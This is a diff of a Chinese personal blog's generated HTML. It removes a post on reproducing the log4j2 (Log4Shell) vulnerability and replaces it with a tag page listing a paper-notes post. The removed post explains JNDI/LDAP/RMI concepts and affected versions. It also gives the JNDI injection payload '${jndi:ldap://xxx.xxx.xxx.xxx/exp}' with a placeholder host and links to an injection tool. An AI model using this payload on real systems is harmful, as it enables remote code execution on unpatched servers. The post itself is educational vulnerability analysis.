@@ -20,24 +20,17 @@
     var CONFIG = {"hostname":"honywen.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Pisces | Gemini":240,"width":300,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="摘要log4j2是Apache开源的一个日志框架，被很多的项目引用。log4j2在整个供应链中举足轻重，其漏洞影响范围也极大，为此我们对漏洞进行复现，并对漏洞产生原因进行分析。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="log4j2漏洞复现">
-<meta property="og:url" content="http://honywen.com/2022/05/15/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+  <meta name="description" content="多多指教">
+<meta property="og:type" content="website">
+<meta property="og:title" content="小咕✨">
+<meta property="og:url" content="http://honywen.com/tags/%E8%81%9A%E7%B1%BB/index.html">
 <meta property="og:site_name" content="小咕✨">
-<meta property="og:description" content="摘要log4j2是Apache开源的一个日志框架，被很多的项目引用。log4j2在整个供应链中举足轻重，其漏洞影响范围也极大，为此我们对漏洞进行复现，并对漏洞产生原因进行分析。">
+<meta property="og:description" content="多多指教">
 <meta property="og:locale">
-<meta property="og:image" content="https://s2.loli.net/2022/05/14/xL1hW8AwnjQltYT.jpg">
-<meta property="og:image" content="https://s2.loli.net/2022/05/14/xzEiJXsZVR7u25N.jpg">
-<meta property="article:published_time" content="2022-05-15T07:48:52.000Z">
-<meta property="article:modified_time" content="2022-05-15T14:13:34.000Z">
 <meta property="article:author" content="honywen">
-<meta property="article:tag" content="漏洞挖掘">
-<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/05/14/xL1hW8AwnjQltYT.jpg">
 
-<link rel="canonical" href="http://honywen.com/2022/05/15/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="http://honywen.com/tags/%E8%81%9A%E7%B1%BB/">
 
 
 <script id="page-configurations">
@@ -45,12 +38,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : true,
+    isPost : false,
     lang   : 'zh-Hans'
   };
 </script>
 
-  <title>log4j2漏洞复现 | 小咕✨</title>
+  <title>Tag: 聚类 | 小咕✨</title>
   
 
 
@@ -169,146 +162,57 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content tag">
             
 
-    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://honywen.com/2022/05/15/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="honywen">
-      <meta itemprop="description" content="多多指教">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小咕✨">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          log4j2漏洞复现
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-05-15 15:48:52 / Modified: 22:13:34" itemprop="dateCreated datePublished" datetime="2022-05-15T15:48:52+08:00">2022-05-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          
   
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2022/05/15/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/15/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        <h2 class="collection-header">聚类
+          <small>Tag</small>
+        </h2>
+      </div>
 
       
-        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>log4j2是Apache开源的一个日志框架，被很多的项目引用。log4j2在整个供应链中举足轻重，其漏洞影响范围也极大，为此我们对漏洞进行复现，并对漏洞产生原因进行分析。</p>
-<a id="more"></a>
-
-
-<h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ul>
-<li><p>log4j：是Apache开源的一个功能强大的日志组件（框架）,提供方便的日志记录。</p>
-</li>
-<li><p>JNDI：JNDI是 Java 命名与目录接口（Java Naming and Directory Interface），JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>
-</li>
-<li><p>JDBC：JDBC的全称是Java数据库连接(Java Database connect)，它是一套用于执行SQL语句的Java API。应用程序可通过这套API连接到关系数据库，并使用SQL语句来完成对数据库中数据的查询、更新和删除等操作。</p>
-</li>
-<li><p>Java RMI（Java Remote Method Invocation）Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。通过RMI可以使得客户端运行的程序调用远程服务器上的对象。</p>
-</li>
-<li><p>LDAP（Lightweight Directory Access Portocol）是一个轻量级目录访问协议。目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。目录服务是由目录数据库和一套访问协议组成的系统。</p>
-</li>
-</ul>
-<p>java的JNDI体系结构：<br><img src="https://s2.loli.net/2022/05/14/xL1hW8AwnjQltYT.jpg" alt="202112200049074148_1.jpg"></p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>log4j2: 2.0~ 2.14.1 版本</p>
-<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><p>被攻击者有log4j，版本符合要求</p>
-<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>漏洞产生的主要原因是log4j在日志输出过程中，未对字符的合法性进行严格的限制，导致加载了JNDI协议的远程恶意对象，从而造成了RCE。<br><img src="https://s2.loli.net/2022/05/14/xzEiJXsZVR7u25N.jpg" alt="v2-9856be233786686f93cbe193d7db3db9_720w.jpg"></p>
-<h3 id="触发过程"><a href="#触发过程" class="headerlink" title="触发过程"></a>触发过程</h3><ul>
-<li>攻击者使用恶意payload（${jndi:ldap://xxx.xxx.xxx.xxx/exp}）进行攻击</li>
-<li>被攻击者对pyload进行解析，通过ldap调用攻击提供的rmi服务</li>
-<li>rmi服务提供恶意类的地址</li>
-<li>被攻击访问远程地址并下载恶意类，本地执行并触发漏洞</li>
-</ul>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这里我们使用JNDI注入器来提供本地LDAP服务<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">https://github.com/welk1n/JNDI-Injection-Exploit/releases</a></p>
-<p>参考：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://chowdera.com/2022/04/202204031556037633.html">https://chowdera.com/2022/04/202204031556037633.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/444017079">https://zhuanlan.zhihu.com/p/444017079</a></li>
-<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1919456">https://cloud.tencent.com/developer/article/1919456</a></li>
-</ul>
-
+    <div class="collection-year">
+      <span class="collection-header">2022</span>
     </div>
 
-    
-    
-    
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
-              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
-          </div>
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2022-09-02T20:37:09+08:00"
+              content="2022-09-02">
+          09-02
+        </time>
+      </div>
 
-        
+      <div class="post-title">
+          <a class="post-title-link" href="/2022/09/02/Usenix2021-%E7%94%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%A3%E7%A0%81%E6%9F%A5%E6%89%BEbug-%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/" itemprop="url">
+            <span itemprop="name">Usenix2021-用自己的代码查找bug-论文笔记</span>
+          </a>
+      </div>
 
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2022/05/12/IVDetect%E7%BB%86%E7%B2%92%E5%BA%A6%E8%A7%A3%E9%87%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/" rel="prev" title="IVDetect细粒度解释的漏洞检测-论文笔记">
-      <i class="fa fa-chevron-left"></i> IVDetect细粒度解释的漏洞检测-论文笔记
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/05/18/%E6%BA%90%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E5%90%91%E8%AE%BA%E6%96%87%E9%9B%86%E5%90%88-%E8%AE%BA%E6%96%87%E6%95%B4%E5%90%88/" rel="next" title="源代码漏洞挖掘方向论文集合-论文整合">
-      源代码漏洞挖掘方向论文集合-论文整合 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
+    </header>
   </article>
+
+    </div>
+  </div>
   
   
+  
+
   
 
 
 
           </div>
           
-    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -355,7 +259,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%A6%81"><span class="nav-number">1.</span> <span class="nav-text">摘要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5"><span class="nav-number">2.</span> <span class="nav-text">一些概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">3.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="nav-number">4.</span> <span class="nav-text">利用前提</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E8%BF%87%E7%A8%8B"><span class="nav-number">5.1.</span> <span class="nav-text">触发过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-number">6.</span> <span class="nav-text">复现过程</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
